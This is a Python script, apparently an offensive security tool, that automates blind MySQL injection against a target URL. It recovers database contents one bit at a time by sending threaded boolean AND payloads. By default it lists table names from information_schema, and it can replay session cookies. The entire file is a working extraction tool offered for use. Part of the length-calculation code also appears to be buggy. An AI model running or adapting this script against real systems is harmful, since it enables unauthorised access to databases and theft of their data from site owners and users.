#!/usr/bin/env python3
#
# [ 08-20-2020 ]
#
# sql-anding.py
#
# written by Ruben Piña [tr3w]
# twitter: @tr3w_
# http://nzt-48.org
#
# "there are only 10 types of people in the world,
#  those who understand binary, and those who don't"
#

import sys
import string
import requests
import hashlib
import time
import argparse
import threading

binstr = 0x00000000
request = 0

def pwn(injection):
    global cookie
    global cookies
       
    url = target + str(injection)
    url = url.replace(' ', '+')
    r = requests.get(url, cookies=cookies)
    data = r.text
    global use_hashes
    global true_string
    global request
    request += 1
 
    if use_hashes:
        return hashlib.md5(data.encode('utf-8')).hexdigest()
    else:
        return data.encode('utf-8')

def get_hashes():
  
    sys.stdout.write("[+] Generating hashes\n")
  
    global hashes
    global tid
    
    null = pwn('0/0')
    hashes.append(null)
    if not tid:
        i = 1
        while 1:
            guess = pwn(i)
            
            if guess != null:
                hashes.append(guess)
                tid = i
                break
            i += 1
    else:
        hashes.append(pwn(tid))

    
    sys.stdout.write("\t[-] Hash #0: %s\n" % ( hashes[0]))
    sys.stdout.write("\t[-] Hash #1: %s\n" % ( hashes[1]))
    


def get_length():

    #print("%s" % (signature))

    index = 1
    j = 1
    
    binlen = '00000000'
    
    size_limit = 0x00
    sizes = [0xff, 0xffff, 0xffffff, 0xffffffff, 0xffffffffffffffff ]
    c = 0
    global use_hashes
    global true_string
    global tid
    global row
    
    while 1:
        #print("%d: " % (sizes[c]))
        inj_length = "%d AND(SELECT LENGTH(%s)FROM %s LIMIT/*LESS*/ %d,1)>%d" % (tid, column, table, row, sizes[c])
        res_length = pwn(inj_length)
        #print("%s\n" % (inj_length))
        c += 1
        if not use_hashes:
            if true_string:
                if str(true_string) not in res_length:
                    break
        else:
            global hashes
            if res_length in hashes[0]:
                break
            
    size = sizes[c - 1] + 1
    limit = len(bin(sizes[c - 1]).replace('0b', ''))
    
    sys.stdout.write("\n\n[+] Calculating length: ")
    sys.stdout.flush()
    
    for i in range(1, limit + 1 ):
       
        
        injection = "%d AND(SELECT MID(LPAD(BIN(length(%s)),%d,'0'),%d,1)FROM %s LIMIT/*LESS*/ %d,1)" % (tid, column, limit, i, table, row)
        #print("%s\n" % (injection))
        result = pwn(injection)
            
        bit = ''
        if not use_hashes:
            bit = '1' if true_string in result else '0'        
        else:
            bit = '1' if hashes[1] in result else '0'
            
   
            sys.stdout.write("%s" % (bit))
            sys.stdout.flush()
            binlen = binlen[:i-1] + bit + binlen[i+1:]

    binlen = int(binlen, 2)
    sys.stdout.write('\n[+] Length found: %d\n' % (binlen))
    return binlen




def inject(index, j):

    global hashes
    global use_hashes
    global tid
    global row

    injection = "%d AND(SELECT ASCII(MID(%s,%d,1))%%26%d FROM %s LIMIT/*LESS*/ %d,1)=%d" % (tid, column, index, j, table, row, j)


 #  print("%s\n" % (injection))
    result = pwn(injection)
   
    bit = 0
    if use_hashes:
        if result in hashes[1]:
            bit = 1
    else:
        bit = 1 if true_string in result else 0        

    global binstr
    if bit:
        binstr = binstr | j


def start():

    global row, number_of_rows
    if use_hashes:
        get_hashes()
    #fix this!!!!
    request = 0
    
    sys.stdout.write("-"*69 + "\n\n" )
    
    while row < number_of_rows:
        index = 0x01
        length = get_length()

        sys.stdout.write("\n[!] Found: ")
        while index <= length:

            t1 = threading.Thread(target = inject, args = (index, 0x1))
            t2 = threading.Thread(target = inject, args = (index, 0x2))
            t3 = threading.Thread(target = inject, args = (index, 0x4))
            t4 = threading.Thread(target = inject, args = (index, 0x8))
            t5 = threading.Thread(target = inject, args = (index, 0x10))
            t6 = threading.Thread(target = inject, args = (index, 0x20))
            t7 = threading.Thread(target = inject, args = (index, 0x40))         
            t8 = threading.Thread(target = inject, args = (index, 0x80))
                
            #print("%d" % (bit))
            global binstr
            binstr = 0x0


            t1.start()
            t2.start()
            t3.start()
            t4.start()
            t5.start()
            t6.start()
            t7.start()
            t8.start()
            
            t1.join()
            t2.join()
            t3.join()
            t4.join()
            t5.join()
            t6.join()
            t7.join()
            t8.join()
            
            
            sys.stdout.write(chr(binstr))
            sys.stdout.flush()

            index  +=  1
        row += 0x01

    return 1


parser = argparse.ArgumentParser(description="Blind MySQL Injection data extraction through bit-anding by tr3w.")
#parser.add_argument('-f','--falseid',     default = 0,    type=int,
#            help = 'id of the page when result is false (default: %(default)')
parser.add_argument('-i','--trueid',    default = 0,    type=int,
        help = 'id of the page when result is true (default: %(default)s)')
parser.add_argument('-s','--string', default = '',
        help = 'Unique string found when result is true, omit to automatically use a signature')
parser.add_argument('-c','--column',     default = "group_concat(table_name)",
        help = 'Column to extract from table (default: %(default)s)')
parser.add_argument('-t','--table',    default = "information_schema.tables",
        help = 'Table name from where to extract data (default: %(default)s)')
parser.add_argument('-r','--row', default = 0, type=int,
        help = 'Row number to extract, default: 0')
parser.add_argument('-m', '--number_of_rows', default = 1, type=int,
        help = 'Number of rows to extract. (default: %(default)s)')
parser.add_argument('-k', '--cookie', default = '', type=str,
        help = "Session cookie")
parser.add_argument('TARGET', help='The vulnerable URL. Example: http://vuln.com/page.php?id= ')
args = parser.parse_args()

use_hashes = 0x00
tid = args.trueid
if args.string:
    true_string = args.string
else:
    use_hashes = 0x01
column    = args.column
table    = args.table
row = args.row
number_of_rows = args.number_of_rows + row
target    = args.TARGET
hashes = []
cookies = {}
cookie = args.cookie or ''
if cookies == {} :
    if cookie:
        cookie = cookie.split('=') or cookie
        if not len(cookie) % 2:
            for i in range(0, len(cookie), 2):
                cookies[cookie[i]] = cookie[i+1]
        else:
            sys.stdout.write('[x] Malformed cookie.\n')
            exit()

   





timer =  time.strftime("%X")
start()
sys.stdout.write("\n\n[+] Start Time: " + timer)
sys.stdout.write("\n[+] End Time:   " + time.strftime("%X"))
sys.stdout.write("\n[+] %d requests\n" % (request))
sys.stdout.write("\n[+] Done.\n")
    
